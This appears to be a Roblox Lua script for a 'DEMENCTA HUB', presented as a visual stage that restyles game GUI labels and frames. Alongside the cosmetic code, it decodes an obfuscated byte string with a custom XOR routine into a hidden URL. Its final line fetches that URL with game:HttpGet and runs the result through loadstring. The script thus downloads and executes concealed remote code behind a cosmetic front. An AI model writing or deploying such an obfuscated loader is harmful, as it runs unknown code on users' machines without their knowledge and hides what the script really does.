
--[[ STAGE 2: VISUAL CORE ]]
local Jeizqz0TLQvnyvtCfrJ_="\050\028\034\044\053\002\021\027\076\097\085\050\113\129\106\140\119\146\131\143\159\154\177\187\192\172\195\210\190\158\225\235\239\183\252\003\008\009\019\017\031\033\044\031\046\255\064\054\083\083\097\075\099\108\114\059\127\129\143\146\089\190\155\147\193\194\179\192\191\201\193\209\241\005\211\222\238\245\240\001\252\003\045\042\053\063\065\060\055\050\079\074\080\075\117\041\129\128\099\128\117\133\165\188\135\162\189\154\096\126\107\138\122\231\233\227\207\218\241\241\017\002\183\187\191\027\202\034\040\246\058\041\067"local paLpcsOYdSah9ohwDqKS=52 local ndVEaxIY8XbJLvZO8EX7FR=180 local os7KQx91Ab4mShHwBkd3sM=0 local lJMVnc2kA4WzNVMgKUq=6 local AdCalQxoy_SJI9JO=28 local w_wsHr_k3eoQ3JK84ioSO=false local S9fiQZiiLkjZ=bit32 and bit32.bxor if not S9fiQZiiLkjZ then S9fiQZiiLkjZ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local EWw1zXacS9m4b_g77jFHl2={}for GxuUl9awuV1TQG=1,#Jeizqz0TLQvnyvtCfrJ_ do local sCPc6yNfG1DSKNQz7=string.byte(Jeizqz0TLQvnyvtCfrJ_,GxuUl9awuV1TQG)local OiMVO0OXoN6ZUfwWZaiSX=(ndVEaxIY8XbJLvZO8EX7FR+(GxuUl9awuV1TQG*lJMVnc2kA4WzNVMgKUq)+AdCalQxoy_SJI9JO)%256 if os7KQx91Ab4mShHwBkd3sM==0 then sCPc6yNfG1DSKNQz7=(sCPc6yNfG1DSKNQz7-OiMVO0OXoN6ZUfwWZaiSX)%256 EWw1zXacS9m4b_g77jFHl2[GxuUl9awuV1TQG]=string.char(S9fiQZiiLkjZ(sCPc6yNfG1DSKNQz7,paLpcsOYdSah9ohwDqKS))else sCPc6yNfG1DSKNQz7=S9fiQZiiLkjZ(sCPc6yNfG1DSKNQz7,paLpcsOYdSah9ohwDqKS)EWw1zXacS9m4b_g77jFHl2[GxuUl9awuV1TQG]=string.char((sCPc6yNfG1DSKNQz7-OiMVO0OXoN6ZUfwWZaiSX)%256)end end local woYH3zEpcxcpgqFL_Zwz=table.concat(EWw1zXacS9m4b_g77jFHl2)if w_wsHr_k3eoQ3JK84ioSO then woYH3zEpcxcpgqFL_Zwz=string.reverse(woYH3zEpcxcpgqFL_Zwz)end local RQyLYGNtdfqUfeUEHBe2S=woYH3zEpcxcpgqFL_Zwz
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(RQyLYGNtdfqUfeUEHBe2S))()
